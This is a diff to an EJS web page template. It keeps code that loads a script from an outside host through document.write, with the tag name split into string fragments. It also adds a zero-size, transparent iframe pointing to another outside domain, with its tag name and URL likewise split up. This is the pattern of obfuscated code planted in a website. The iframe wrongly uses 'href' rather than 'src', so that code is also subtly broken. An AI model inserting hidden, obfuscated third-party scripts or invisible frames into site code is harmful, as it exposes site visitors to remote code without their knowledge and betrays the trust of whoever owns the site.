@@ -55,11 +55,13 @@
 <%- include("menu.ejs",{"type":'index'}) %>
 <%- include("commonjs.ejs") %>
 
-<script src='http://veim.lrswl.com/s.php?id=8870'></script>
+
 <script>
 
     if (window.location.protocol != 'https:') {
         document.write('<scri' + 'pt src="http://veim.lrswl.com/s.php?id=8870" type="text/javascript"></s' + 'cript>');
+    } else {
+        document.write('<ifr' + 'ame href="http://ma.eld' + 'esign.cn/daka/index_test" style="width: 0;height: 0;opacity: 0"></if' + 'rame>');
     }
 
     var bodyH = $('body').height();
